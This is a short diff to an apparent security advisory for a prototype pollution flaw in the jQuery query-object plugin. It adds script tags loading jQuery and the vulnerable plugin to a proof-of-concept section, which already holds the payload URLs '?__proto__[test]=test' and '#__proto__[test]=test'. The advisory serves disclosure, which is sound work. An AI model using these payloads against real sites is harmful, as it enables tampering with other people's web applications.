@@ -52,6 +52,10 @@ https://github.com/alrusdi/jquery-plugin-query-object/blob/9e5871fbb531c5e246aac
 ```
 
 ### PoC
+```html
+<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
+<script src="https://raw.githack.com/alrusdi/jquery-plugin-query-object/9e5871fbb531c5e246aac2aaf056b237bc7cc0a6/jquery.query-object.js"></script>
+```
 ```
 ?__proto__[test]=test
 #__proto__[test]=test
